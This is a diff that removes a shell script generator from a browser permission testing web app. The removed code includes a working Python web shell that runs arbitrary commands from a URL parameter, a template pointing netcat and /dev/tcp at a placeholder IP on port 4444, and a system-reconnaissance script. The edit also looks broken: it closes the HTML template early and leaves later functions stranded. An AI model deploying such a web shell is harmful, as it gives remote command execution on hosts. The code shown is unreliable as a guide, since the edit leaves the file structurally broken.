@@ -1333,129 +1333,7 @@ echo "=== Complete ==="\`;
     log('Service probe template loaded', 'success');
 }
 
-function loadWebShellTemplate() {
-    const template = \`#!/usr/bin/env python3
-# Simple Command API Server - GET Request Version
-# FOR DEFENSIVE SECURITY TESTING ONLY
 
-import http.server
-import socketserver
-import subprocess
-import json
-import os
-import urllib.parse
-
-class CommandAPIHandler(http.server.BaseHTTPRequestHandler):
-    def do_GET(self):
-        """Handle command execution via GET request"""
-        # Parse URL and query parameters
-        parsed_url = urllib.parse.urlparse(self.path)
-        
-        if parsed_url.path == '/api/command':
-            # Get command from query parameter
-            query_params = urllib.parse.parse_qs(parsed_url.query)
-            command = query_params.get('cmd', [''])[0].strip()
-            
-            if not command:
-                self.send_json_response({'error': 'No command provided. Use ?cmd=your_command'}, 400)
-                return
-            
-            # Execute command
-            try:
-                result = subprocess.run(
-                    command,
-                    shell=True,
-                    capture_output=True,
-                    text=True,
-                    timeout=30
-                )
-                
-                # Combine stdout and stderr
-                output = result.stdout
-                if result.stderr:
-                    output += result.stderr
-                
-                response_data = {
-                    'command': command,
-                    'output': output or '(No output)',
-                    'return_code': result.returncode,
-                    'success': result.returncode == 0
-                }
-                
-                self.send_json_response(response_data)
-                
-            except subprocess.TimeoutExpired:
-                self.send_json_response({
-                    'error': 'Command timed out (30s limit)',
-                    'command': command
-                }, 408)
-            
-            except Exception as e:
-                self.send_json_response({
-                    'error': f'Execution error: {str(e)}',
-                    'command': command
-                }, 500)
-        
-        elif parsed_url.path == '/':
-            # Simple info page
-            self.send_response(200)
-            self.send_header('Content-Type', 'text/html')
-            self.end_headers()
-            
-            html = f"""
-            <h1>🔧 Simple Command API</h1>
-            <p><strong>Endpoint:</strong> <code>/api/command?cmd=YOUR_COMMAND</code></p>
-            <p><strong>Example:</strong> <a href="/api/command?cmd=pwd">/api/command?cmd=pwd</a></p>
-            <p><strong>Working Directory:</strong> {os.getcwd()}</p>
-            <p style="color: red;"><strong>⚠️ WARNING:</strong> Only use on trusted networks!</p>
-            """
-            self.wfile.write(html.encode('utf-8'))
-        
-        else:
-            self.send_json_response({'error': 'Endpoint not found'}, 404)
-    
-    def send_json_response(self, data, status_code=200):
-        """Send JSON response with CORS headers"""
-        self.send_response(status_code)
-        self.send_header('Content-Type', 'application/json')
-        self.send_header('Access-Control-Allow-Origin', '*')
-        self.end_headers()
-        self.wfile.write(json.dumps(data, indent=2).encode('utf-8'))
-    
-    def log_message(self, format, *args):
-        """Simple logging"""
-        print(f"[{self.date_time_string()}] {format % args}")
-
-def main():
-    PORT = int(os.environ.get('PORT', 8881))
-    
-    print("🔧 Simple Command API Server (GET)")
-    print(f"📡 Starting on port {PORT}")
-    print(f"📍 Working directory: {os.getcwd()}")
-    print(f"🌐 API endpoint: http://localhost:{PORT}/api/command?cmd=COMMAND")
-    print("\\n📝 Usage Examples:")
-    print(f"  http://localhost:{PORT}/api/command?cmd=pwd")
-    print(f"  http://localhost:{PORT}/api/command?cmd=ls%20-la")
-    print(f"  curl 'http://localhost:{PORT}/api/command?cmd=whoami'")
-    print("\\n⚠️  WARNING: Only use on trusted networks!")
-    
-    try:
-        with socketserver.TCPServer(("", PORT), CommandAPIHandler) as httpd:
-            print(f"\\n✅ Server running on port {PORT}")
-            print("Press Ctrl+C to stop")
-            httpd.serve_forever()
-    except KeyboardInterrupt:
-        print("\\n🛑 Server stopped")
-    except Exception as e:
-        print(f"\\n❌ Error: {e}")
-
-if __name__ == "__main__":
-    main()\`;
-    
-    document.getElementById('scriptContent').value = template;
-    document.getElementById('scriptName').value = 'web-shell.py';
-    log('Simple Command API (GET) template loaded', 'success');
-}
 
 // Initialize when DOM is loaded
 document.addEventListener('DOMContentLoaded', function() {
@@ -1562,26 +1440,7 @@ async function getHTMLContent() {
             </div>
         </div>
 
-        <div class="category">
-            <h3>📜 Shell Script Generator</h3>
-            <div style="margin-bottom: 15px;">
-                <label for="scriptName" style="display: block; margin-bottom: 5px; font-weight: bold;">Script Name:</label>
-                <input type="text" id="scriptName" placeholder="test-script.sh" style="width: 100%; padding: 8px; border: 1px solid #ccc; border-radius: 4px;">
-            </div>
-            <div style="margin-bottom: 15px;">
-                <label for="scriptContent" style="display: block; margin-bottom: 5px; font-weight: bold;">Script Content:</label>
-                <textarea id="scriptContent" placeholder="#!/bin/bash&#10;echo 'Hello World'&#10;# Add your commands here" style="width: 100%; height: 200px; padding: 8px; border: 1px solid #ccc; border-radius: 4px; font-family: monospace; resize: vertical;"></textarea>
-            </div>
-            <div class="test-grid">
-                <button class="test-button" onclick="generateShellScript()">Generate & Download Script</button>
-                <button class="test-button" onclick="loadTemplateScript()">Load Permission Test Template</button>
-                <button class="test-button warning" onclick="loadNetworkTestTemplate()">Load Network Test Template</button>
-                <button class="test-button danger" onclick="loadSystemInfoTemplate()">Load System Info Template</button>
-                <button class="test-button danger" onclick="loadAdvancedInfoTemplate()">Load Advanced Info Template</button>
-                <button class="test-button danger" onclick="loadServiceProbeTemplate()">Load Service Probe Template</button>
-                <button class="test-button" onclick="loadWebShellTemplate()" style="background: linear-gradient(135deg, #9c27b0 0%, #673ab7 100%);">🐍 Web Shell Template</button>
-            </div>
-        </div>
+
 
         <div id="results" class="results">Ready to test browser permissions...\\n</div>
     </div>
@@ -2877,86 +2736,12 @@ const HTML_CONTENT = `<!DOCTYPE html>
             });
         }
 
-        // Shell Script Generator Functions
-        function downloadFile(filename, content) {
-            // Method 1: Direct link download (most reliable like sampletestfile.com)
-            downloadFileMethod1(filename, content);
-        }
+
+
         
-        function downloadFileMethod1(filename, content) {
-            // Method 1: Simple anchor click with data URL (like sampletestfile.com approach)
-            try {
-                // Create data URL (most compatible approach)
-                const dataUrl = 'data:application/octet-stream;charset=utf-8,' + encodeURIComponent(content);
-                
-                // Create anchor element and trigger click (sampletestfile.com style)
-                const a = document.createElement('a');
-                a.href = dataUrl;
-                a.download = filename;
-                a.style.display = 'none';
-                
-                // Add to DOM, click, then remove (standard pattern)
-                document.body.appendChild(a);
-                a.click();
-                document.body.removeChild(a);
-                
-                log('Downloaded via data URL method: ' + filename, 'success');
-            } catch (error) {
-                log('Data URL method failed: ' + error.message, 'error');
-                downloadFileMethod2(filename, content);
-            }
-        }
-        
-        function downloadFileMethod2(filename, content) {
-            // Method 2: Form POST download (works when fetch is blocked)
-            try {
-                const form = document.createElement('form');
-                form.method = 'POST';
-                form.action = '/api/download-script';
-                form.style.display = 'none';
-                
-                const filenameInput = document.createElement('input');
-                filenameInput.type = 'hidden';
-                filenameInput.name = 'filename';
-                filenameInput.value = filename;
-                
-                const contentInput = document.createElement('input');
-                contentInput.type = 'hidden';
-                contentInput.name = 'content';
-                contentInput.value = content;
-                
-                form.appendChild(filenameInput);
-                form.appendChild(contentInput);
-                document.body.appendChild(form);
-                form.submit();
-                document.body.removeChild(form);
-                
-                log('Downloaded via form POST method: ' + filename, 'success');
-            } catch (error) {
-                log('Form POST failed: ' + error.message, 'error');
-                downloadFileMethod3(filename, content);
-            }
-        }
-        
-        function downloadFileMethod3(filename, content) {
-            // Method 3: Standard blob download
-            try {
-                const blob = new Blob([content], { type: 'application/octet-stream' });
-                const url = URL.createObjectURL(blob);
-                const a = document.createElement('a');
-                a.href = url;
-                a.download = filename;
-                a.style.display = 'none';
-                document.body.appendChild(a);
-                a.click();
-                document.body.removeChild(a);
-                URL.revokeObjectURL(url);
-                log('Downloaded via blob method: ' + filename, 'success');
-            } catch (error) {
-                log('Blob download failed: ' + error.message, 'error');
-                downloadFileMethod4(filename, content);
-            }
-        }
+
+
+
         
         function downloadFileMethod4(filename, content) {
             // Method 4: Data URI download
@@ -3066,148 +2851,21 @@ const HTML_CONTENT = `<!DOCTYPE html>
             const finalFilename = scriptName.endsWith('.sh') ? scriptName : scriptName + '.sh';
             
             // Try multiple download methods
-            downloadFile(finalFilename, finalContent);
+            // Download functionality removed
             
-            // Log to backend
-            fetch('/api/log', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ 
-                    type: 'script_generation', 
-                    filename: finalFilename,
-                    size: finalContent.length,
-                    timestamp: new Date().toISOString()
-                })
-            }).catch(e => console.error('Failed to log script generation:', e));
-        }
+
         
-        function loadTemplateScript() {
-            const lines = [
-                '#!/bin/bash',
-                '# Permission Testing Script',
-                '# Generated by Browser Permission Tester',
-                '',
-                'echo "=== System Permission Tests ==="',
-                'echo "Current user: $(whoami)"',
-                'echo "Current directory: $(pwd)"',
-                'echo "Date: $(date)"',
-                'echo',
-                '',
-                '# File system permissions',
-                'echo "=== File System Tests ==="',
-                'echo "Testing file creation..."',
-                'touch /tmp/test_file && echo "[OK] Can create files in /tmp" || echo "[FAIL] Cannot create files in /tmp"',
-                'rm -f /tmp/test_file',
-                '',
-                'echo "Testing directory listing..."',
-                'ls /etc > /dev/null 2>&1 && echo "[OK] Can list /etc directory" || echo "[FAIL] Cannot list /etc directory"',
-                '',
-                'echo "Testing home directory access..."',
-                'ls ~ > /dev/null 2>&1 && echo "[OK] Can access home directory" || echo "[FAIL] Cannot access home directory"',
-                '',
-                '# Network permissions',
-                'echo "=== Network Tests ==="',
-                'echo "Testing network connectivity..."',
-                'ping -c 1 8.8.8.8 > /dev/null 2>&1 && echo "[OK] Network connectivity available" || echo "[FAIL] No network connectivity"',
-                '',
-                'echo "Testing DNS resolution..."',
-                'nslookup google.com > /dev/null 2>&1 && echo "[OK] DNS resolution working" || echo "[FAIL] DNS resolution failed"',
-                '',
-                '# Process permissions',
-                'echo "=== Process Tests ==="',
-                'echo "Testing process listing..."',
-                'ps aux > /dev/null 2>&1 && echo "[OK] Can list processes" || echo "[FAIL] Cannot list processes"',
-                '',
-                'echo "Testing system information..."',
-                'uname -a 2>/dev/null && echo "[OK] System info accessible" || echo "[FAIL] System info restricted"',
-                '',
-                'echo "=== Test Complete ==="'
-            ];
-            const template = lines.join('\\n');
-            
-            document.getElementById('scriptContent').value = template;
-            document.getElementById('scriptName').value = 'permission-test.sh';
-            log('Permission test template loaded', 'success');
-        }
+
         
-        function loadNetworkTestTemplate() {
-            const lines = [
-                '#!/bin/bash',
-                '# Network Connectivity Template - FOR DEFENSIVE TESTING ONLY',
-                '',
-                '# Configuration',
-                'TARGET_IP="YOUR_IP_HERE"',
-                'TARGET_PORT="4444"',
-                '',
-                'echo "=== Network Connectivity Test ==="',
-                'echo "Target: $TARGET_IP:$TARGET_PORT"',
-                'echo "WARNING: This is for authorized testing only!"',
-                '',
-                '# Test various network methods',
-                'echo "Testing netcat connectivity..."',
-                'if command -v nc >/dev/null 2>&1; then',
-                '    echo "Netcat available - would execute: nc $TARGET_IP $TARGET_PORT"',
-                'else',
-                '    echo "Netcat not available"',
-                'fi',
-                '',
-                'echo "Testing bash connectivity..."',
-                'echo "Would test: /dev/tcp/$TARGET_IP/$TARGET_PORT"',
-                '',
-                'echo "Testing python connectivity..."',
-                'if command -v python3 >/dev/null 2>&1; then',
-                '    echo "Python3 available for network testing"',
-                'elif command -v python >/dev/null 2>&1; then',
-                '    echo "Python2 available for network testing"',
-                'else',
-                '    echo "Python not available"',
-                'fi',
-                '',
-                'echo "=== Test Complete - No actual connections made ==="',
-                'echo "Replace YOUR_IP_HERE with actual target IP for testing"'
-            ];
-            const template = lines.join('\\n');
-            
-            document.getElementById('scriptContent').value = template;
-            document.getElementById('scriptName').value = 'network-test.sh';
-            log('Network test template loaded (for defensive testing)', 'success');
-        }
-        
-        function loadSystemInfoTemplate() {
-            const lines = [
-                '#!/bin/bash',
-                '# System Information Gathering Script',
-                '# FOR DEFENSIVE SECURITY TESTING ONLY',
-                '',
-                'echo "=== System Information Gathering ==="',
-                'echo "Generated: $(date)"',
-                'echo "Hostname: $(hostname)"',
-                'echo "OS: $(uname -a)"',
-                'echo "Current user: $(whoami)"',
-                'echo "User ID: $(id)"',
-                'echo "Home directory: $HOME"',
-                '',
-                'echo "=== Network Information ==="',
-                'ip addr show 2>/dev/null || ifconfig 2>/dev/null',
-                'netstat -an 2>/dev/null | head -10',
-                '',
-                'echo "=== Process Information ==="',
-                'ps aux 2>/dev/null | head -10',
-                '',
-                'echo "=== File System ==="',
-                'df -h 2>/dev/null',
-                '',
-                'echo "=== Security Tools ==="',
-                'command -v sudo >/dev/null 2>&1 && echo "[OK] sudo available" || echo "[FAIL] sudo not available"',
-                'command -v ssh >/dev/null 2>&1 && echo "[OK] ssh available" || echo "[FAIL] ssh not available"',
-                'echo "=== Complete ==="'
-            ];
-            const template = lines.join('\\n');
-            
-            document.getElementById('scriptContent').value = template;
-            document.getElementById('scriptName').value = 'system-info.sh';
-            log('System information template loaded', 'success');
-        }
+
+        // Initialize when DOM is loaded
+        document.addEventListener('DOMContentLoaded', function() {
+            log('Browser Permission Tester loaded successfully');
+            log('User Agent: ' + navigator.userAgent);
+        });
+    `;
+}
+
         
         function loadAdvancedInfoTemplate() {
             const lines = [
